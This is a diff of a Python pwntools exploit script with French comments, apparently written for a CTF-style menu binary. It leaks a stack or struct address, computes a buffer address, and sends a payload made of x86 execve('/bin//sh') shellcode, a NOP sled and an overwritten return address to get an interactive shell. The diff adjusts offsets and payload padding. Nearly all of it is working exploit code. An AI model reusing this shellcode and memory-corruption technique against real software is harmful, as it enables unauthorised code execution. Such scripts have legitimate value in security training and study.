@@ -46,12 +46,12 @@ p.recv()
 p.sendline("2")
 p.recv()
 
-'''
 print("Seeking leaked @ now ! ")
 p.sendline("5")
 text = p.recv()
 
-addr = text[26:38]
+#38
+addr = text[26:33]
 #print(addr.hex())
 import binascii
 addr=binascii.unhexlify(addr.hex()).decode('utf8')
@@ -59,6 +59,7 @@ print(" Adresse turnOn de la struct: %s" % addr)
 buffer = int(addr,16)- 56
 print("buffer @ = 0x%x" % buffer)
 #print("buffer @ = %s" % hex(buffer))
+
 hexa=hex(buffer)[2:]
 hexa="".join(reversed([hexa[i:i+2] for i in range(0, len(hexa), 2)]))
 final=""
@@ -77,7 +78,10 @@ s= pwnlib.util.packing.p64(buffer, endian='little')
 print(s)
 #print(binascii.unhexlify(binascii.hexlify(s)))
 #print("buffer packed =" + str(s))
-'''
+#adresse = input("#YourTurn: @? ")
+#print(adresse)
+#printf '\xde\xad\xbe\xef'
+
 
 print("Destruction des 2 interfaces crees !") 
 #destroy
@@ -101,8 +105,11 @@ p.recv()
 p.sendline("c")
 p.recv()
 #20 shellcode+ 12 NOP +4@ (8*4)=64
+
 #Shell:`perl -e 'print "\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" . "\x90" x 12 . "\xC8\xB2\xAE\xEB\xFF\x7F" x 4 '`
-shellcode="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"+"\x90" * 12 + ("\xb2\x1a\x00\x80"+"\x11"*4)*4
+shellcode="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"+"\x90" * 40+"\xad\xde\xfe\xca"
+#"\x44\x33\x22\x11" * 4
+#("\xb2\x1a\x00\x80"+"\x11"*4)*4
 #final*4
 #0x0000000008000ab2
 	
@@ -131,7 +138,7 @@ p.sendline("0")
 p.recv()
 p.sendline("2")
 p.recv()
-p.sendline("5")
+p.sendline("6")
 print(p.recv())
 
 p.interactive()
